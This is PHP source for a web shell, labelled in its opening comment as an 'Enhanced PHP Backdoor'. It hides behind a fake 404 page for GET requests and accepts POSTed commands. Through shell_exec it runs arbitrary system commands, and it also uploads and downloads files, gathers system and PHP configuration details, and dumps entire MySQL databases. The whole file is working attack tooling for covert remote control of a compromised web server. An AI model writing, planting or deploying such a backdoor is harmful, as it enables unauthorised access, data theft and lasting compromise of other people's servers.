<?php
// Enhanced PHP Backdoor with Weevely-like features
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 404 Not Found');
    echo '<h1>404 Not Found</h1>';
    exit;
}

session_start();

// Security through obscurity - random session name
if (!isset($_SESSION['initialized'])) {
    $_SESSION['current_dir'] = getcwd();
    $_SESSION['auth_token'] = bin2hex(random_bytes(16));
    $_SESSION['initialized'] = true;
}

// Simple authentication check
if (isset($_POST['auth']) && $_POST['auth'] !== $_SESSION['auth_token']) {
    header('HTTP/1.1 403 Forbidden');
    exit;
}

if (!isset($_POST['cmd'])) {
    if (!isset($_SESSION['current_dir']) || !is_dir($_SESSION['current_dir'])) {
        $_SESSION['current_dir'] = getcwd();
    }
    echo json_encode([
        'status' => 'success',
        'current_dir' => $_SESSION['current_dir'],
        'auth_token' => $_SESSION['auth_token']
    ]);
    exit;
}

$cmd = $_POST['cmd'];
$current_dir = $_SESSION['current_dir'];

// Ensure we're in the correct directory
if (!chdir($current_dir)) {
    echo json_encode(['status' => 'error', 'message' => 'Failed to change directory']);
    exit;
}

// Command routing
switch ($cmd) {
    case 'cd':
        handle_cd($_POST['path'] ?? '');
        break;
    case 'file_upload':
        handle_file_upload();
        break;
    case 'file_download':
        handle_file_download($_POST['file_path'] ?? '');
        break;
    case 'sysinfo':
        handle_sysinfo();
        break;
    case 'phpenv':
        handle_phpenv();
        break;
    case 'sql_dump':
        handle_sql_dump($_POST['db_config'] ?? '');
        break;
    default:
        handle_system_command($cmd);
}

function handle_cd($path) {
    global $current_dir;
    
    if (empty($path)) {
        echo json_encode(['status' => 'error', 'message' => 'No path provided']);
        return;
    }

    $path = str_replace('\\', '/', $path);
    
    if ($path === '..') {
        $new_path = dirname($current_dir);
    } elseif ($path === '.') {
        $new_path = $current_dir;
    } else {
        $new_path = $path[0] === '/' ? $path : $current_dir . '/' . $path;
    }

    $real_path = realpath($new_path);
    
    if ($real_path === false || !is_dir($real_path)) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid directory']);
    } elseif (!is_readable($real_path)) {
        echo json_encode(['status' => 'error', 'message' => 'Directory not readable']);
    } elseif (chdir($real_path)) {
        $_SESSION['current_dir'] = getcwd();
        echo json_encode([
            'status' => 'success', 
            'current_dir' => $_SESSION['current_dir']
        ]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Unknown error']);
    }
}

function handle_file_upload() {
    if (!isset($_FILES['file_data'])) {
        echo json_encode(['status' => 'error', 'message' => 'No file uploaded']);
        return;
    }

    $upload_file = $_FILES['file_data'];
    $target_path = $_POST['target_path'] ?? $upload_file['name'];
    
    if (move_uploaded_file($upload_file['tmp_name'], $target_path)) {
        echo json_encode(['status' => 'success', 'message' => 'File uploaded successfully']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'File upload failed']);
    }
}

function handle_file_download($file_path) {
    if (empty($file_path) || !file_exists($file_path) || !is_readable($file_path)) {
        header('HTTP/1.1 404 Not Found');
        exit;
    }

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
    header('Content-Length: ' . filesize($file_path));
    readfile($file_path);
    exit;
}

function handle_sysinfo() {
    $info = [
        'php_version' => PHP_VERSION,
        'os' => PHP_OS,
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'current_user' => function_exists('get_current_user') ? get_current_user() : 'N/A',
        'memory_usage' => memory_get_usage(true),
        'memory_peak' => memory_get_peak_usage(true),
        'loaded_extensions' => get_loaded_extensions(),
        'disabled_functions' => ini_get('disable_functions') ? explode(',', ini_get('disable_functions')) : [],
    ];
    
    echo json_encode(['status' => 'success', 'system_info' => $info]);
}

function handle_phpenv() {
    $env = [
        'ini_settings' => [
            'safe_mode' => ini_get('safe_mode'),
            'open_basedir' => ini_get('open_basedir'),
            'disable_functions' => ini_get('disable_functions'),
            'memory_limit' => ini_get('memory_limit'),
            'max_execution_time' => ini_get('max_execution_time'),
            'post_max_size' => ini_get('post_max_size'),
            'upload_max_filesize' => ini_get('upload_max_filesize'),
        ],
        'constants' => get_defined_constants(true),
    ];
    
    echo json_encode(['status' => 'success', 'php_environment' => $env]);
}

function handle_sql_dump($db_config) {
    if (empty($db_config)) {
        echo json_encode(['status' => 'error', 'message' => 'No database config provided']);
        return;
    }

    $config = json_decode($db_config, true);
    if (!$config) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid database config']);
        return;
    }

    try {
        $pdo = new PDO(
            "mysql:host={$config['host']};dbname={$config['database']}", 
            $config['username'], 
            $config['password']
        );
        
        $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
        $dump = "";
        
        foreach ($tables as $table) {
            $dump .= "-- Table: $table\n";
            $result = $pdo->query("SELECT * FROM $table");
            while ($row = $result->fetch(PDO::FETCH_ASSOC)) {
                $dump .= "INSERT INTO $table VALUES (" . 
                    implode(', ', array_map(function($v) use ($pdo) {
                        return $pdo->quote($v);
                    }, $row)) . ");\n";
            }
        }
        
        echo json_encode(['status' => 'success', 'dump' => $dump]);
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
}

function handle_system_command($cmd) {
    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    
    // Enhanced command processing
    $cmd_parts = explode(' ', $cmd, 2);
    $command = $cmd_parts[0];
    $arg = $cmd_parts[1] ?? '';
    
    // Special handling for common commands
    if (in_array($command, ['ls', 'dir'])) {
        $target_dir = $arg ?: '.';
        if ($is_windows) {
            $output = shell_exec("dir \"$target_dir\" 2>&1");
        } else {
            $output = shell_exec("ls -la \"$target_dir\" 2>&1");
        }
    } else {
        $output = shell_exec("$cmd 2>&1");
    }
    
    echo json_encode([
        'status' => 'success',
        'output' => $output ?: 'No output',
        'current_dir' => getcwd()
    ]);
}
?>
